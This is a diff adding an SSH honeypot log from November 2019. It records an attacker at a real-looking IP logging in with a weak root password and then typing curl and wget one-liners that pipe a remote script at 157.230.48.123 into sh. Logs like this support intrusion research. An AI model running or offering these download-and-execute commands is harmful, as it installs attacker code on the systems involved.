@@ -1,0 +1,22 @@
+2019-11-16 21:22:37.935 - [Info] MITM Version: 1.26
+2019-11-16 21:22:37.941 - [Info] Auto Access Enabled: true
+2019-11-16 21:22:37.942 - [Debug] [Init] Auto Access Barrier: true
+2019-11-16 21:22:37.964 - [Info] SSH man-in-the-middle server for 172.20.0.4 listening on 0.0.0.0:10103
+2019-11-16 21:33:17.682 - [Debug] [Connection] Attacker connected: 128.199.75.69 | Client Identification: SSH-2.0-Go
+2019-11-16 21:33:19.180 - [Debug] [Auth] Attacker 128.199.75.69 trying to authenticate with "none"
+2019-11-16 21:33:19.180 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-16 21:33:19.701 - [Debug] [Auth] Attacker 128.199.75.69 trying to authenticate with "password"
+2019-11-16 21:33:19.705 - [Debug] [Auto Access] Attacker: 128.199.75.69, Threshold: 1, Attempts: 1
+2019-11-16 21:33:19.705 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-16 21:33:19.706 - [Debug] [Auto Access] Adding the following credentials: "root:123@asd@qwe"
+2019-11-16 21:33:20.018 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-16 21:33:20.019 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.4
+2019-11-16 21:33:20.123 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-16 21:33:21.170 - [Debug] [SHELL] Opened shell for attacker
+2019-11-16 21:33:21.688 - [Debug] [SHELL] Attacker Keystroke: curl[Space]-fsSL[Space]http://157.230.48.123:8000/i.sh[Space]|[Space]sh[LF]
+2019-11-16 21:33:21.696 - [Debug] [SHELL] line from reader: curl -fsSL http://157.230.48.123:8000/i.sh | sh
+2019-11-16 21:33:21.696 - [Debug] [SHELL] Keystroke buffer: 99,117,114,108,32,45,102,115,83,76,32,104,116,116,112,58,47,47,49,53,55,46,50,51,48,46,52,56,46,49,50,51,58,56,48,48,48,47,105,46,115,104,32,124,32,115,104,10
+2019-11-16 21:33:21.697 - [Debug] [SHELL] Attacker Keystroke: wget[Space]-q[Space]-O-[Space]http://157.230.48.123:8000/i.sh[Space]|[Space]sh[LF]
+2019-11-16 21:33:21.703 - [Debug] [SHELL] line from reader: wget -q -O- http://157.230.48.123:8000/i.sh | sh
+2019-11-16 21:33:21.703 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,45,113,32,45,79,45,32,104,116,116,112,58,47,47,49,53,55,46,50,51,48,46,52,56,46,49,50,51,58,56,48,48,48,47,105,46,115,104,32,124,32,115,104,10
+2019-11-16 21:33:21.704 - [Debug] [SHELL] Attacker ended the shell
